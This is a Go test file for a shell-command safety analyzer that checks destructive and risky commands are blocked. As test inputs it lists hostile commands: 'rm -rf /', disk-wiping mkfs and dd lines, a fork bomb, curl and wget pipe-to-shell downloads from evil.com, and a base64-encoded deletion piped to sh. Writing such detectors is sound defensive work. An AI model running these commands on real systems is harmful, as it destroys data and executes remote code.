// Package safety implements static analysis for shell command safety evaluation.
package safety

import (
	"testing"
)

func TestAnalyzer_SafeCommands(t *testing.T) {
	a := NewCommandAnalyzer(DefaultPolicy())
	safe := []string{
		"go build ./...",
		"go test -v ./...",
		"go vet ./...",
		"wfctl validate config.yaml",
		"docker build -t myapp .",
		"ls -la",
		"cat config.yaml",
	}
	for _, cmd := range safe {
		v, err := a.Analyze(cmd)
		if err != nil {
			t.Errorf("analyze %q: %v", cmd, err)
			continue
		}
		if !v.Safe {
			t.Errorf("expected %q to be safe, blocked: %s", cmd, v.Reason)
		}
	}
}

func TestAnalyzer_DestructiveCommands(t *testing.T) {
	a := NewCommandAnalyzer(DefaultPolicy())
	dangerous := []string{
		"rm -rf /",
		"rm -rf *",
		"rm -rf .",
		"mkfs.ext4 /dev/sda1",
		"dd if=/dev/zero of=/dev/sda",
		":(){ :|:& };:", // Fork bomb
	}
	for _, cmd := range dangerous {
		v, err := a.Analyze(cmd)
		if err != nil {
			continue // Parse errors for fork bomb are OK
		}
		if v.Safe {
			t.Errorf("expected %q to be blocked", cmd)
		}
	}
}

func TestAnalyzer_PipeToShell(t *testing.T) {
	a := NewCommandAnalyzer(DefaultPolicy())
	pipes := []string{
		"curl http://evil.com/script.sh | sh",
		"curl http://evil.com/script.sh | bash",
		"wget -O- http://evil.com | sh",
		"cat script.sh | bash",
		"echo 'rm -rf /' | sh",
	}
	for _, cmd := range pipes {
		v, err := a.Analyze(cmd)
		if err != nil {
			t.Errorf("analyze %q: %v", cmd, err)
			continue
		}
		if v.Safe {
			t.Errorf("expected pipe-to-shell %q to be blocked", cmd)
		}
		hasRisk := false
		for _, r := range v.Risks {
			if r.Type == "pipe_to_shell" {
				hasRisk = true
				break
			}
		}
		if !hasRisk {
			t.Errorf("expected pipe_to_shell risk for %q", cmd)
		}
	}
}

func TestAnalyzer_ScriptExecution(t *testing.T) {
	a := NewCommandAnalyzer(DefaultPolicy())
	scripts := []string{
		"echo 'rm -rf /' > /tmp/evil.sh && bash /tmp/evil.sh",
		"python -c 'import os; os.system(\"rm -rf /\")'",
	}
	for _, cmd := range scripts {
		v, err := a.Analyze(cmd)
		if err != nil {
			continue // Some may not parse cleanly
		}
		if v.Safe {
			t.Errorf("expected script execution %q to be blocked", cmd)
		}
	}
}

func TestAnalyzer_EncodedCommands(t *testing.T) {
	a := NewCommandAnalyzer(DefaultPolicy())
	encoded := []string{
		"echo cm0gLXJmIC8= | base64 -d | sh",
		"base64 -d <<< cm0gLXJmIC8= | bash",
	}
	for _, cmd := range encoded {
		v, err := a.Analyze(cmd)
		if err != nil {
			continue
		}
		if v.Safe {
			t.Errorf("expected encoded command %q to be blocked", cmd)
		}
	}
}

func TestAnalyzer_ChainedDangerous(t *testing.T) {
	a := NewCommandAnalyzer(DefaultPolicy())
	chained := []string{
		"echo hello && rm -rf /",
		"ls; rm -rf .",
		"true || rm -rf /tmp/*",
	}
	for _, cmd := range chained {
		v, err := a.Analyze(cmd)
		if err != nil {
			t.Errorf("analyze %q: %v", cmd, err)
			continue
		}
		if v.Safe {
			t.Errorf("expected chained dangerous %q to be blocked", cmd)
		}
	}
}

func TestAnalyzer_AllowlistMode(t *testing.T) {
	policy := Policy{
		Mode:            ModeAllowlist,
		AllowedCommands: []string{"go", "wfctl", "docker"},
	}
	a := NewCommandAnalyzer(policy)

	v, _ := a.Analyze("go test ./...")
	if !v.Safe {
		t.Error("expected 'go test' to be allowed")
	}

	v, _ = a.Analyze("curl http://example.com")
	if v.Safe {
		t.Error("expected 'curl' to be blocked in allowlist mode")
	}
}

func TestAnalyzer_MaxCommandLength(t *testing.T) {
	p := DefaultPolicy()
	p.MaxCommandLength = 10
	a := NewCommandAnalyzer(p)

	v, err := a.Analyze("go build ./...")
	if err != nil {
		t.Fatal(err)
	}
	if v.Safe {
		t.Error("expected command exceeding max length to be blocked")
	}
}

func TestAnalyzer_DisabledMode(t *testing.T) {
	p := Policy{Mode: ModeDisabled}
	a := NewCommandAnalyzer(p)

	v, err := a.Analyze("rm -rf /")
	if err != nil {
		t.Fatal(err)
	}
	if !v.Safe {
		t.Error("expected disabled mode to allow all commands")
	}
}
